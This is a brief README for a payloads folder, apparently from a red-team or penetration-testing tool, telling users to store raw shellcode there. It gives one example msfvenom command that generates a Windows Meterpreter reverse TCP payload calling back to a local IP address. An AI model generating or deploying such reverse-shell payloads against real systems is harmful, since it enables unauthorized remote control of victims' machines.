# Payloads Directory

Place your raw shellcode files (e.g., generated from `msfvenom`) in this directory.

**Example msfvenom command:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o beacon.bin
```
